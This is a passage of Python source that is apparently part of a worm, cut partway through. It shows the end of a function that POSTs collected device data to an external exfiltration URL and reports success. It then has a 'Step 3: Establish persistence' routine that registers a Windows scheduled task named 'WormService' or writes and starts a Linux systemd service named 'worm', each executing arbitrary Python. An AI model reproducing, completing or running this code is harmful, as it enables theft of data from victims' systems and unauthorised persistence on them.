        try:
            response = requests.post(url, json=data)
            if response.status_code == 200:
                print("Data exfiltrated successfully")
            else:
                print("Failed to exfiltrate data")
        except Exception as e:
            print(f"Error exfiltrating data: {e}")
    
    data_to_exfiltrate = {"devices": devices}
    exfiltrate_data(exfiltration_url, data_to_exfiltrate)
    
    # Step 3: Establish persistence
    def create_persistence():
        system = platform.system()
        if system == "Windows":
            service_name = "WormService"
            service_command = f'schtasks /create /tn {service_name} /tr "pythonw.exe -c import sys; exec(sys.stdin.read())" /sc onlogon'
            os.system(service_command)
        elif system == "Linux":
            service_name = "worm"
            service_content = f'[Unit]\nDescription=Worm Service\n[Service]\nExecStart=/usr/bin/python3 -c "import sys; exec(sys.stdin.read())"\n[Install]\nWantedBy=multi-user.target'
            with open(f"/etc/systemd/system/{service_name}.service", "w") as f:
                f.write(service_content)
            os.system(f"systemctl enable {service_name}")
            os.system(f"systemctl start {service_name}")
    
    create_persistence()
